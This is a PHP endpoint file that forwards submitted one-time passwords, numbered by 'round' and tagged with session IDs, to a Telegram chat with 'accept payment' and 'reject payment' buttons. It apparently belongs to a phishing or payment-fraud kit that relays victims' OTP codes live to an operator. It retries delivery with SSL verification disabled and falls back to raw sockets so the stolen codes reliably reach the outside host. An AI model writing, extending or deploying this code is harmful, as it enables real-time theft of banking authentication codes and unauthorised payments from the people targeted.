<?php

// ============================
// api/notify_otp.php
// ============================
require_once __DIR__ . '/../config.php';

function telegramDebug(string $message): void {
    $logFile = __DIR__ . '/../data/telegram_send.log';
    @file_put_contents($logFile, '[' . date('Y-m-d H:i:s') . "] notify_otp.php " . $message . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function telegramBuildPostFields(array $payload): string {
    if (isset($payload['reply_markup']) && is_array($payload['reply_markup'])) {
        $payload['reply_markup'] = json_encode($payload['reply_markup'], JSON_UNESCAPED_UNICODE);
    }
    return http_build_query($payload);
}

function telegramResponseOk($response): bool {
    if (!is_string($response) || $response === '') {
        return false;
    }
    $decoded = json_decode($response, true);
    return is_array($decoded) && !empty($decoded['ok']);
}

/**
 * Send message to Telegram in shutdown phase.
 * Kept reliable (not ultra-short timeout) because response is already returned.
 */
function sendTelegram(array $payload): void {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $postFields = telegramBuildPostFields($payload);
    if ($postFields === '') {
        telegramDebug('post fields empty');
        return;
    }

    $sent = false;

    if (function_exists('curl_init')) {
        $attempts = 2;
        for ($i = 0; $i < $attempts; $i++) {
            foreach ([true, false] as $verifySsl) {
                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_POST            => true,
                    CURLOPT_POSTFIELDS      => $postFields,
                    CURLOPT_HTTPHEADER      => ['Content-Type: application/x-www-form-urlencoded'],
                    CURLOPT_RETURNTRANSFER  => true,
                    CURLOPT_TIMEOUT         => 8,
                    CURLOPT_CONNECTTIMEOUT  => 4,
                    CURLOPT_SSL_VERIFYPEER  => $verifySsl,
                    CURLOPT_SSL_VERIFYHOST  => $verifySsl ? 2 : 0,
                    CURLOPT_IPRESOLVE       => CURL_IPRESOLVE_V4,
                    CURLOPT_NOSIGNAL        => true,
                ]);
                $response = curl_exec($ch);
                $errNo = curl_errno($ch);
                $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                if ($errNo === 0 && $httpCode >= 200 && $httpCode < 300 && telegramResponseOk($response)) {
                    $sent = true;
                    telegramDebug("curl success ssl_verify=" . ($verifySsl ? '1' : '0') . " http=" . $httpCode);
                    break;
                }
                $snippet = is_string($response) ? substr($response, 0, 220) : 'no_response';
                telegramDebug("curl fail ssl_verify=" . ($verifySsl ? '1' : '0') . " errno={$errNo} http={$httpCode} body={$snippet}");
            }

            if ($sent) {
                break;
            }
            usleep(200000);
        }
    }

    if ($sent) {
        return;
    }

    $ctx = stream_context_create(['http' => [
        'method'        => 'POST',
        'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content'       => $postFields,
        'timeout'       => 8,
        'ignore_errors' => true,
    ]]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res !== false && telegramResponseOk($res)) {
        telegramDebug('stream success');
        return;
    }
    telegramDebug('stream fail body=' . (is_string($res) ? substr($res, 0, 220) : 'no_response'));

    // Last fallback for limited hosting environments.
    $parsed = parse_url($url);
    if (!is_array($parsed) || empty($parsed['host']) || empty($parsed['path'])) {
        return;
    }
    $host = $parsed['host'];
    $path = $parsed['path'];
    $port = 443;
    $fp = @fsockopen('ssl://' . $host, $port, $errno, $errstr, 4);
    if (!$fp) {
        telegramDebug("fsockopen fail errno={$errno} err={$errstr}");
        return;
    }
    stream_set_timeout($fp, 5);
    $request = "POST {$path} HTTP/1.1\r\n";
    $request .= "Host: {$host}\r\n";
    $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $request .= "Content-Length: " . strlen($postFields) . "\r\n";
    $request .= "Connection: close\r\n\r\n";
    $request .= $postFields;
    fwrite($fp, $request);
    fclose($fp);
    telegramDebug('fsockopen send attempt done');
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonResponse(['error' => 'Method not allowed'], 405);
}

$body      = json_decode(file_get_contents('php://input'), true) ?? [];
telegramDebug('request received');
$round     = (int)($body['round'] ?? 0);
$otp       = trim($body['otp'] ?? '');
$sessionId = trim($body['sessionId'] ?? '');
$scheme    = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host      = $_SERVER['HTTP_HOST'] ?? '';
$baseUrl   = $host !== '' ? ($scheme . '://' . $host) : '';

$message = "📲 OTP جديد (الجولة {$round})";
if ($otp !== '')       $message .= "\nالرمز: {$otp}";
if ($sessionId !== '') $message .= "\nSession: {$sessionId}";

$payload = [
    'chat_id' => TELEGRAM_CHAT_ID,
    'text'    => $message,
];

// Use direct links for approve/reject actions.
if ($sessionId !== '' && $baseUrl !== '') {
    $approveUrl = $baseUrl . '/api/action.php?sessionId=' . urlencode($sessionId) . '&action=approved&token=' . urlencode(DASH_PASS);
    $rejectUrl  = $baseUrl . '/api/action.php?sessionId=' . urlencode($sessionId) . '&action=rejected&token=' . urlencode(DASH_PASS);
    $payload['reply_markup'] = [
        'inline_keyboard' => [[
            ['text' => '✅ قبول الدفع', 'url' => $approveUrl],
            ['text' => '❌ رفض الدفع',  'url' => $rejectUrl],
        ]],
    ];
}

register_shutdown_function('sendTelegram', $payload);

jsonResponse(['success' => true]);
